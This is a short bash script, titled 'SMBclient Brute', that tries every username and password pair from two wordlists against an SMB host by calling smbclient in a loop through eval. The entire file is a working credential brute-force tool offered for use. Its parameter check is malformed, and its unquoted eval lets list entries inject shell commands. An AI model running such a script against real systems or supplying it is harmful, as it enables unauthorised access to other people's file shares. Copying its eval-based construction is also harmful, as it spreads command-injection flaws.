#!/bin/bash

host=$3
userfile=$1
paswfile=$2

echo "+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+"
echo "|S|M|B|c|l|i|e|n|t| |B|r|u|t|e|"
echo "+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+"

echo "+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+-+"
echo "|M|a|d|e| |b|y| |W|h|i|t|e|Z|u|c|c|a|"
echo "+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+-+"

echo "Usage: ./smbclientbrute username.txt password.txt host.test"

if [$host = ''] || [$userfile = ''] || [$paswfile = '']
then
	echo "Some parameter missing...."
	#echo "Usage: ./smbclientbrute username.txt password.txt host.test"
else

while read psw; do
	while read usr; do
		command='smbclient -L $host -U $usr%$psw'
		echo smbclient -L $host -U $usr%$psw
		eval $command
	done < $userfile
done < $paswfile
fi